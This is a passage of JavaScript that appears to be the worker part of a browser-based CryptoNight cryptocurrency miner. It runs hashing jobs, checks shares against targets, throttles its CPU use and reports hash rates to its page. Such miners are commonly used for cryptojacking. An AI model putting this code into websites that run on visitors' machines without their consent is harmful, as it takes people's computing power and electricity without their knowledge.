    return bytes
});
CWW.prototype.bytesToHex = (function(bytes) {
    for (var hex = "", i = 0; i < bytes.length; i++) {
        hex += (bytes[i] >>> 4).toString(16);
        hex += (bytes[i] & 15).toString(16)
    }
    return hex
});
CWW.prototype.meetsTarget = (function(hash, target) {
    for (var i = 0; i < target.length; i++) {
        var hi = hash.length - i - 1,
            ti = target.length - i - 1;
        if (hash[hi] > target[ti]) {
            return !1
        } else if (hash[hi] < target[ti]) {
            return !0
        }
    }
    return !1
});
CWW.prototype.setJob = (function(job) {
    this.currentJob = job;
    this.blob = this.hexToBytes(job.blob);
    this.input.set(this.blob);
    var target = this.hexToBytes(job.target);
    if (target.length <= 8) {
        for (var i = 0; i < target.length; i++) {
            this.target[this.target.length - i - 1] = target[target.length - i - 1]
        }
        for (var i = 0; i < this.target.length - target.length; i++) {
            this.target[i] = 255
        }
    } else {
        this.target = target
    }
});
CWW.prototype.now = (function() {
    return self.performance ? self.performance.now() : Date.now()
});
CWW.prototype.hash = (function(input, output, length) {
    var nonce = Math.random() * 4294967295 + 1 >>> 0;
    this.input[39] = (nonce & 4278190080) >> 24;
    this.input[40] = (nonce & 16711680) >> 16;
    this.input[41] = (nonce & 65280) >> 8;
    this.input[42] = (nonce & 255) >> 0;
    _cryptonight_hash(this.ctx, input.byteOffset, output.byteOffset, length)
});
CWW.prototype.verify = (function(job) {
    this.blob = this.hexToBytes(job.blob);
    this.input.set(this.blob);
    for (var i = 0, c = 0; c < job.nonce.length; c += 2, i++) {
        this.input[39 + i] = parseInt(job.nonce.substr(c, 2), 16)
    }
    _cryptonight_hash(this.ctx, this.input.byteOffset, this.output.byteOffset, this.blob.length);
    var result = this.bytesToHex(this.output);
    self.postMessage({
        verify_id: job.verify_id,
        verified: result === job.result
    })
});
CWW.prototype.work = (function() {
    var hashes = 0;
    var meetsTarget = !1;
    var start = this.now();
    var elapsed = 0;
    do {
        this.hash(this.input, this.output, this.blob.length);
        hashes++;
        meetsTarget = this.meetsTarget(this.output, this.target);
        elapsed = this.now() - start
    } while (!meetsTarget && elapsed < 1e3);
    var hashesPerSecond = hashes / (elapsed / 1e3);
    if (meetsTarget) {
        var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
        var resultHex = this.bytesToHex(this.output);
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: hashes,
            job_id: this.currentJob.job_id,
            nonce: nonceHex,
            result: resultHex
        })
    } else {
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: hashes
        })
    }
});
CWW.prototype.workThrottled = (function() {
    var start = this.now();
    this.hash(this.input, this.output, this.blob.length);
    var end = this.now();
    var timePerHash = end - start;
    this.throttledHashes++;
    var elapsed = end - this.throttledStart;
    var hashesPerSecond = this.throttledHashes / (elapsed / 1e3);
    if (this.meetsTarget(this.output, this.target)) {
        var nonceHex = this.bytesToHex(this.input.subarray(39, 43));
        var resultHex = this.bytesToHex(this.output);
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: this.throttledHashes,
            job_id: this.currentJob.job_id,
            nonce: nonceHex,
            result: resultHex
        });
        this.throttledHashes = 0
    } else if (elapsed > 1e3) {
        self.postMessage({
            hashesPerSecond: hashesPerSecond,
            hashes: this.throttledHashes
        });
        this.throttledHashes = 0
    } else {
        var wait = Math.min(2e3, timePerHash * this.throttleWait);
        setTimeout(this.workThrottledBound, wait)
    }
});
Module.onRuntimeInitialized = (function() {
    var cryptonight = new CWW
})
